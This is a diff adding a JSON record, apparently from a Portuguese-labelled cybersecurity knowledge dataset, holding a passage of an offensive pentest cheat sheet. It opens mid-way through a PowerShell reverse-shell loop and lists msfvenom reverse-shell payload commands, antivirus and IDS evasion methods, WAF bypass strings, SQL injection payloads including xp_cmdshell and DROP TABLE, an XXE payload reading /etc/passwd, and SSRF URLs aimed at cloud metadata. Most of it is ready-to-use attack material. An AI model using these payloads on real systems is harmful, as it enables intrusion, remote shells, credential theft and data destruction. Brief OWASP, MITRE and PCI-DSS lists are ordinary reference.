@@ -1,0 +1,13 @@
+{
+  "id": "Penetration_Testing_Advanced_2_2026-05-07T14:35:24.361611",
+  "titulo": "Penetration Testing Advanced - Parte 3/4",
+  "conteudo": "iex $data 2>&1 | Out-String )\n    $stream.Write($sendback,0,$sendback.Length)\n}\n```\n\n### Meterpreter Payloads\n```bash\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf\nmsfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shell.php\n```\n\n## EVASION TECHNIQUES\n\n### IDS/IPS Evasion\n- Packet fragmentation\n- TTL manipulation\n- Decoy scanning: nmap -D\n- Randomize timing: nmap -T2\n- Source port manipulation\n\n### AV Evasion\n- Obfuscation (base64, ROT13)\n- Encryption (AES, XOR)\n- Packing (UPX, Themida)\n- Code caves injection\n- Process hollowing\n\n### WAF Bypass\n```\n# Parameter pollution\n?id=1&id=2' OR '1'='1\n\n# HTTP Parameter Pollution\n?search=<script&search=>alert(1)</script>\n\n# Case manipulation\nSELECT vs SeLeCt\n\n# Comment insertion\nSEL/*comment*/ECT\n```\n\n## COMPLIANCE & FRAMEWORKS\n\n### OWASP Top 10\n1. Broken Access Control\n2. Cryptographic Failures\n3. Injection\n4. Insecure Design\n5. Security Misconfiguration\n6. Vulnerable Components\n7. Authentication Failures\n8. Software/Data Integrity\n9. Logging/Monitoring Failures\n10. SSRF\n\n### MITRE ATT&CK\n- Tactics: Initial Access → Impact\n- Techniques: T1059 (Command Execution)\n- Sub-techniques: T1059.001 (PowerShell)\n\n### PCI-DSS Requirements\n- Network security controls\n- Data encryption at rest/transit\n- Access control implementation\n- Regular security testing\n\n## CHEATSHEETS\n\n### SQL Injection\n```sql\n-- MySQL\n' OR 1=1#\n' UNION SELECT NULL,table_name FROM information_schema.tables#\n\n-- MSSQL\n'; EXEC xp_cmdshell('whoami')--\n\n-- Oracle\n' UNION SELECT NULL FROM dual--\n\n-- PostgreSQL\n'; DROP TABLE users--\n```\n\n### XXE (XML External Entity)\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>\n```\n\n### SSRF (Server-Side Request Forgery)\n```\nhttp://localhost:80\nhttp://169.254.169.254/latest/meta-data/\nhttp://0.0.0.0:8080",
+  "tags": [
+    "pentest",
+    "hacking",
+    "nmap"
+  ],
+  "fonte": "Penetration Testing Advanced",
+  "tipo": "conhecimento_tecnico_cybersecurity",
+  "criado_em": "2026-05-07T14:35:24.361615"
+}
